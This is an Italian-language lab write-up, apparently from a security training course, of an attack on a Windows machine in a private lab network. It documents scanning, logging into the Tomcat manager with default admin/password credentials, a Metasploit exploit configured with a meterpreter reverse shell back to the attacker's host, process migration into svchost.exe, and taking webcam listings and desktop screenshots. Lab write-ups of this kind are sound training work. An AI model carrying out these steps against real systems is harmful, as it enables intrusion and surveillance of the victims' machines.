PRE BUILD WEEK 2

0 - configurazione di rete dispositivi attaccante e target:	Attaccante 192.168.200.100, Target 192.168.200.200

1 - Scansione nella rete per rilevare il target: sudoo arp-scan -l

2 - Scansione con nmpa  del sistema, dei servizi sulle porte aperte e con script per testare vulnerabilità.
	Scansione base con nessus per capire le vulnerabilità. Vulnerabilità da sfruttare: Apache Tomcat
	(nessus_scan_windows_10.html && nmpa_scan.txt)

3.0 - Accedo dal browser alla porta 8080 "http://192.168.200.200:8080". Si nota subito il banner verde con scritto "if you're seeing this, you've successfully installed Tomcat. Congratulations!"
	ciò significa che il servizio una volta installato non è stato configurato.

3.1 - Accedo alla pagina del Manager ed appare un popup "Sign in", provo le classiche credenziali con immissione manuale

3.2 - Scopro che la coppia "admin-password" funziona e mi permette di accedere al manager.

4.0 - Eseguo una ricerca del servizio Tomcat: search Tomcat type:exploit platform:windows.

4.1 - Scelgo l'exploit "exploit/multi/http/tomcat_ngr_display", configurato con:
	- HttpPassword: password
	- HttpUsername: admin
	- RHOSTS:	192.168.200.200
	- RPORT:	8080
	- TARGETURI:	/manager
	payload per target Windows quindi "windows/meterpreter/reverse_tcp"
	- LHOST 192.168.200.100
	- LPORT 7777
	viene dato il "run" e si apre una sessione meterpreter.

5 - ottenuto l'accesso al server Tomcat procedo con l'analisi del sistema target:
	sysinfo, ipconfig, route, ls, run post/windows/gather/checkvm (verifica se si tratta di VM).
	(immagini 5.0, 5.1)

6.0 - Provando ad ottenere la lista delle webcams ed a fare uno screenshot, riscontro un errore che dice che la corrente sessione
	è stata creata da un servizio server su una macchina windows 8+. Quindi tale servizio non ha desktop e procedo con la
	verififica della Process List con "ps".
	Identifico il servizio "svchost.exe" con PID "344", User "DESKTOP-9K104BT\user"; è attivo poiché la Sessione è "1" ovvero attiva.

6.1/6.2 - Migro al processo trovato nel precedente punto, con "migrate 344". Ovvero sposto il mio payload dal processo sul quale sta
	lavorando a quello trovato. (poiché mi da accesso allo user attivo del target per continuare ad ottener einfo sul sistema
	ed è anche stabile il collegamento poiché il processo scelto è essenziale per il funzionamento della macchina della vittima.
	Eseguo i seguenti comandi per ottenere le info di sistema:
		getuid, sysinfo, ipconfig, route, webcam_list, screenshot.
	(screenshot desktop target: screenshot.png)